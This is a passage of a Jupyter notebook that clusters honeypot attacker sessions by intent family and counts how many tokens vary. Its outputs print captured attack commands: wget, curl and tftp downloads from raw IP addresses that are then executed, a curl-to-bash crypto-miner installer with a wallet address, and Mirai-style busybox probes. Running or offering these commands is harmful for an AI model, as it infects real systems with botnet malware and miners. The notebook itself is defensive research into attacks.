   "metadata": {},
   "source": [
    "### This is an interesting case in which I can associate more than 1 \"type\" of session to the same intent\n",
    "#### Let's see an example"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "26e7b23b-6016-40e3-ad43-d364b312630b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12],\n",
       " [0.3686635944700461,\n",
       "  0.4608294930875576,\n",
       "  0.2764976958525346,\n",
       "  0.3686635944700461,\n",
       "  0.7373271889400922,\n",
       "  99.72350230414747,\n",
       "  0.3686635944700461,\n",
       "  0.4608294930875576,\n",
       "  0.6451612903225806,\n",
       "  99.72350230414747,\n",
       "  0.4608294930875576,\n",
       "  100.0,\n",
       "  0.09216589861751152])"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "indexes_random_word = [it for it, el in enumerate(to_plot) if el!=1] \n",
    "occ_random_words = [el for it, el in enumerate(to_plot) if el!=1] \n",
    "\n",
    "indexes_random_word, occ_random_words"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "6cfdbdfb-eba3-41f0-9063-836d1175e780",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Examples of sessions which might be very different, but still following the same sequence of intents: \n",
      "Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution\n",
      "\n",
      "\n",
      "(+x) - cd /tmp && chmod +x 61mVjztA && bash -c ./61mVjztA ; ./61mVjztA ;\n",
      "\n",
      "(31.210.20.24/bins/UnHAnaAW.x86) - cd /tmp ; wget 31.210.20.24/bins/UnHAnaAW.x86 ; chmod +x UnHAnaAW.x86 ; ./UnHAnaAW.x86 Root ;\n",
      "\n",
      "(http://107.172.249.148/x86_64) - cd /tmp ; wget http://107.172.249.148/x86_64 ; chmod 777 * ; ./x86_64 roots ;\n",
      "\n",
      "(-s) - uname -a ; curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 46YHk3xuonM9whfqoZK51qNbfyXF2acbJUgz8K24wb1oc4PDanQjwU3iFRH3BcmyKfL1V3qzhiMDABWQ6PwYrTt1AYBVbYt ;\n",
      "\n",
      "(http://45.133.9.188/x86_64) - cd /tmp/ ; wget http://45.133.9.188/x86_64 ; chmod 777 * ; ./x86_64 myroots ;\n",
      "\n",
      "(-O) - wget https://www.nasapaul.com/ninfo ; curl -O https://www.nasapaul.com/ninfo ; chmod 777 * ; ./ninfo ;\n",
      "\n",
      "(179.43.175.83/x86_64) - cd /tmp/ ; wget 179.43.175.83/x86_64 ; chmod 777 x86_64 ; ./x86_64 x86xhed ;\n",
      "\n",
      "(sep.sh) - curl -L http://104.244.74.191/sep.sh -o sep.sh && chmod +x sep.sh && bash ./sep.sh ;\n",
      "\n",
      "\n",
      "{'+x': 1078, '31.210.20.24/bins/UnHAnaAW.x86': 1, 'http://107.172.249.148/x86_64': 1, '-s': 1, 'http://45.133.9.188/x86_64': 1, '-O': 1, '179.43.175.83/x86_64': 1, 'sep.sh': 1}\n"
     ]
    }
   ],
   "source": [
    "selected_family = filtered_prototypes.iloc[0].Models_predictions\n",
    "prev_words = {}\n",
    "print(f\"Examples of sessions which might be very different, but still following the same sequence of intents: \\n{selected_family}\\n\\n\")\n",
    "filtered_corpus = predicted_corpus[predicted_corpus.Models_predictions == selected_family]\n",
    "for it in range(filtered_corpus.shape[0]):\n",
    "    splitted_session = filtered_corpus.full_session.iloc[it].split(\" \")\n",
    "    if splitted_session[indexes_random_word[4]] not in prev_words.keys():\n",
    "        prev_words[splitted_session[indexes_random_word[4]]] = 0\n",
    "        print(f\"({splitted_session[indexes_random_word[4]]}) - {filtered_corpus.full_session.iloc[it]}\")\n",
    "        print()\n",
    "    prev_words[splitted_session[indexes_random_word[4]]] += 1\n",
    "print(f\"\\n{prev_words}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5218aab6-21ec-4762-b600-a1704b51a548",
   "metadata": {},
   "source": [
    "#### Now, focus on a single case and perform analysis similar to the one above"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "0341e60c-b650-4ba3-9f06-e5c865d46349",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Before filtering: 1085\n",
      "After filtering: 1078\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/opt/conda/lib/python3.7/site-packages/ipykernel_launcher.py:2: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  \n"
     ]
    }
   ],
   "source": [
    "print(f\"Before filtering: {filtered_corpus.shape[0]}\")\n",
    "filtered_corpus[\"is_desired_type\"] = filtered_corpus.full_session.apply(lambda session: session.split(\" \")[4] == \"+x\")\n",
    "filtered_corpus = filtered_corpus[filtered_corpus.is_desired_type == True]\n",
    "print(f\"After filtering: {filtered_corpus.shape[0]}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "e25eb1fb-37f4-499e-9666-7e67de4ebb49",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "For family: \n",
      "Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution\n",
      "\n",
      "\n",
      "cd /tmp && chmod +x 61mVjztA && bash -c ./61mVjztA ; ./61mVjztA ;\n",
      "\n",
      "cd /tmp && chmod +x PoC9yh0X && bash -c ./PoC9yh0X ; ./PoC9yh0X ;\n",
      "\n",
      "cd /tmp && chmod +x T95LUtYe && bash -c ./T95LUtYe ; ./T95LUtYe ;\n",
      "\n",
      "cd /tmp && chmod +x ySanWBxl && bash -c ./ySanWBxl ; ./ySanWBxl ;\n",
      "\n",
      "cd /tmp && chmod +x w0sHld08 && bash -c ./w0sHld08 ; ./w0sHld08 ;\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(f\"For family: \\n{selected_family}\\n\\n\")\n",
    "for it in range(5):\n",
    "    print(filtered_corpus.full_session.iloc[it])\n",
    "    print()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3add3a07-e83a-4d0d-a021-4f5c550516c7",
   "metadata": {},
   "source": [
    "#### Again, stats about the executables:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "a611cbb7-0836-456a-9cea-5f38c805e1ab",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session_id</th>\n",
       "      <th>full_session</th>\n",
       "      <th>source_ips</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>Predicted_classes</th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>is_desired_type</th>\n",
       "      <th>executable</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>4</td>\n",
       "      <td>cd /tmp &amp;&amp; chmod +x 61mVjztA &amp;&amp; bash -c ./61mV...</td>\n",
       "      <td>180.129.119.43</td>\n",
       "      <td>2021-03-06 00:09:44</td>\n",
       "      <td>Execution -- Execution -- Execution -- Executi...</td>\n",
       "      <td>Execution -- Execution -- Execution -- Executi...</td>\n",
       "      <td>True</td>\n",
       "      <td>./61mVjztA</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>14</td>\n",
       "      <td>cd /tmp &amp;&amp; chmod +x PoC9yh0X &amp;&amp; bash -c ./PoC9...</td>\n",
       "      <td>106.104.177.189</td>\n",
       "      <td>2021-03-06 00:32:31</td>\n",
       "      <td>Execution -- Execution -- Execution -- Executi...</td>\n",
       "      <td>Execution -- Execution -- Execution -- Executi...</td>\n",
       "      <td>True</td>\n",
       "      <td>./PoC9yh0X</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    session_id                                       full_session  \\\n",
       "4            4  cd /tmp && chmod +x 61mVjztA && bash -c ./61mV...   \n",
       "14          14  cd /tmp && chmod +x PoC9yh0X && bash -c ./PoC9...   \n",
       "\n",
       "         source_ips      first_timestamp  \\\n",
       "4    180.129.119.43  2021-03-06 00:09:44   \n",
       "14  106.104.177.189  2021-03-06 00:32:31   \n",
       "\n",
       "                                    Predicted_classes  \\\n",
       "4   Execution -- Execution -- Execution -- Executi...   \n",
       "14  Execution -- Execution -- Execution -- Executi...   \n",
       "\n",
       "                                   Models_predictions  is_desired_type  \\\n",
       "4   Execution -- Execution -- Execution -- Executi...             True   \n",
       "14  Execution -- Execution -- Execution -- Executi...             True   \n",
       "\n",
       "    executable  \n",
       "4   ./61mVjztA  \n",
       "14  ./PoC9yh0X  "
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_corpus[\"executable\"] = filtered_corpus.full_session.apply(lambda session: session.split(\" \")[-2])\n",
    "filtered_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f3242a3-fae5-4754-b978-47a5ceaa2193",
   "metadata": {},
   "source": [
    "### How many unique executables?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "f55c0226-2ba6-414d-9c6c-2597fd239f91",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of unique executables: 1078 (100.0 %)\n"
     ]
    }
   ],
   "source": [
    "print(f\"Number of unique executables: {filtered_corpus.executable.nunique()} ({filtered_corpus.executable.nunique() / filtered_corpus.shape[0] * 100} %)\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92e8df80-2393-4a7e-b64e-c37cab219cc4",
   "metadata": {},
   "source": [
    "## Now, last example\n",
    "### Let's choose a family in which the number of changing words is high on respect to the total number of words "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "df20342a-da42-405d-b97b-fe9cd8644292",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>associated_sessions</th>\n",
       "      <th>percentage_varying_elements</th>\n",
       "      <th>prototype</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>185</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>50705</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.0019721920915097132, 0.0019721920915097132...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>179</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>26527</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.003769744034380066, 0.003769744034380066, ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                    Models_predictions  associated_sessions  \\\n",
       "185  Discovery -- Discovery -- Discovery -- Discove...                50705   \n",
       "179  Discovery -- Discovery -- Discovery -- Discove...                26527   \n",
       "\n",
       "     percentage_varying_elements  \\\n",
       "185                        100.0   \n",
       "179                        100.0   \n",
       "\n",
       "                                             prototype  \n",
       "185  [[0.0019721920915097132, 0.0019721920915097132...  \n",
       "179  [[0.003769744034380066, 0.003769744034380066, ...  "
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_prototypes.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "143151e5-4c83-4b84-a6c6-d33ffcc4ea10",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/opt/conda/lib/python3.7/site-packages/ipykernel_launcher.py:1: UserWarning: Boolean Series key will be reindexed to match DataFrame index.\n",
      "  \"\"\"Entry point for launching an IPython kernel.\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Models_predictions</th>\n",
       "      <th>associated_sessions</th>\n",
       "      <th>percentage_varying_elements</th>\n",
       "      <th>prototype</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>185</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>50705</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.0019721920915097132, 0.0019721920915097132...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>179</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>26527</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.003769744034380066, 0.003769744034380066, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>41</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>102</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.9803921568627451, 0.9803921568627451, 0.98...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1023</th>\n",
       "      <td>Persistence -- Persistence -- Persistence -- P...</td>\n",
       "      <td>121</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.8264462809917356, 0.8264462809917356, 0.82...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Discovery -- Discovery -- Discovery -- Discove...</td>\n",
       "      <td>126</td>\n",
       "      <td>100.0</td>\n",
       "      <td>[[0.7936507936507936, 0.7936507936507936, 0.79...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                     Models_predictions  associated_sessions  \\\n",
       "185   Discovery -- Discovery -- Discovery -- Discove...                50705   \n",
       "179   Discovery -- Discovery -- Discovery -- Discove...                26527   \n",
       "41    Discovery -- Discovery -- Discovery -- Discove...                  102   \n",
       "1023  Persistence -- Persistence -- Persistence -- P...                  121   \n",
       "7     Discovery -- Discovery -- Discovery -- Discove...                  126   \n",
       "\n",
       "      percentage_varying_elements  \\\n",
       "185                         100.0   \n",
       "179                         100.0   \n",
       "41                          100.0   \n",
       "1023                        100.0   \n",
       "7                           100.0   \n",
       "\n",
       "                                              prototype  \n",
       "185   [[0.0019721920915097132, 0.0019721920915097132...  \n",
       "179   [[0.003769744034380066, 0.003769744034380066, ...  \n",
       "41    [[0.9803921568627451, 0.9803921568627451, 0.98...  \n",
       "1023  [[0.8264462809917356, 0.8264462809917356, 0.82...  \n",
       "7     [[0.7936507936507936, 0.7936507936507936, 0.79...  "
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_prototypes = df_prototypes.sort_values(by = \"percentage_varying_elements\", ascending = False)[df_prototypes.associated_sessions > 100]\n",
    "filtered_prototypes.head(5)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2c0f6000-2074-4952-9c86-4157be013633",
   "metadata": {},
   "source": [
    "#### Choose 3rd example\n",
    "##### Good for future works?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "id": "34df92f2-69e1-4157-b377-aa60ac6f4449",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 500x400 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "to_plot = filtered_prototypes.iloc[4].prototype[0]\n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(5,4))\n",
    "fontsize = 20\n",
    "axs.bar(np.arange(to_plot.shape[0]), to_plot)\n",
    "#axs.scatter(cdf_full_predictions.reset_index()[\"Counter\"], cdf_full_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "#axs.scatter(cdf_no_rep_predictions.reset_index()[\"Counter\"], cdf_no_rep_predictions.reset_index()[0], c = \"k\", s = 20)\n",
    "\n",
    "axs.set_xlabel(\"Words' positions\", fontsize = fontsize - 5)\n",
    "axs.set_ylabel('Unique elements per position', fontsize = fontsize - 5)\n",
    "axs.set_title(f'Unique elements per posision\\nwrt selected family', fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.grid()\n",
    "#axs.set_ylim(0,1.05)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "43d46391-1c94-4aae-bc58-70ffe4fe6d5c",
   "metadata": {},
   "source": [
    "#### What happens on those cases in which the word is NOT completelly randomic "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "id": "d22f80a2-1ef7-4051-aa1c-1ba20d31818d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61]\n",
      "[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61]\n"
     ]
    }
   ],
   "source": [
    "selected_family = filtered_prototypes.iloc[4].Models_predictions\n",
    "indexes_random_word = [it for it, el in enumerate(to_plot) if el!=1] \n",
    "print(indexes_random_word)\n",
    "indexes_random_word = [it for it, el in enumerate(to_plot) if el!=1 and el != predicted_corpus[predicted_corpus.Models_predictions == selected_family].shape[0]] \n",
    "print(indexes_random_word)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "id": "152a7cae-0a1f-47da-90d6-4a4a878df7b3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox CQEGM ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox CQEGM ; tftp ; wget ; /bin/busybox CQEGM ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox CQEGM ; rm .s ; exit ;'"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "predicted_corpus[predicted_corpus.Models_predictions == selected_family].full_session.iloc[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e300f2c4-9287-4477-b1ab-6fb52d40f113",
   "metadata": {},
   "source": [
    "#### Examples belonging to that family: "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "23a99fed-4543-4acd-9145-6db78226dc8e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Examples of sessions which might be very different, but still following the same sequence of intents: \n",
      "Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Discovery -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution -- Execution\n",
      "\n",
      "\n",
      "(enable) - enable ; system ; shell ; sh ; cat /proc/mounts ; /bin/busybox ZNAFZ ; cd /dev/shm ; cat .s || cp /bin/echo .s ; /bin/busybox ZNAFZ ; tftp ; wget ; /bin/busybox ZNAFZ ; dd bs=52 count=1 if=.s || cat .s || while read i ; do echo $i ; done < .s ; /bin/busybox ZNAFZ ; rm .s ; tftp -l.i -r.i -g 24.68.127.176:63760 ; chmod 777 .i ; ./.i ; exit ;\n",
      "\n",
      "\n",
      "{'enable': 102}\n"
     ]
    }
   ],
   "source": [
    "prev_words = {}\n",
    "print(f\"Examples of sessions which might be very different, but still following the same sequence of intents: \\n{selected_family}\\n\\n\")\n",
    "filtered_corpus = predicted_corpus[predicted_corpus.Models_predictions == selected_family]\n",
    "for it in range(filtered_corpus.shape[0]):\n",
    "    splitted_session = filtered_corpus.full_session.iloc[it].split(\" \")\n",
    "    if splitted_session[indexes_random_word[0]] not in prev_words.keys():\n",
    "        prev_words[splitted_session[indexes_random_word[0]]] = 0\n",
    "        print(f\"({splitted_session[indexes_random_word[0]]}) - {filtered_corpus.full_session.iloc[it]}\")\n",
    "        print()\n",
    "    prev_words[splitted_session[indexes_random_word[0]]] += 1\n",
    "print(f\"\\n{prev_words}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "40915ab7-7f55-4db8-930b-0fdd7d8cb4f9",
   "metadata": {},
   "source": [
    "#### Clearly, here we have weakness > model cannot read binaries yet"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
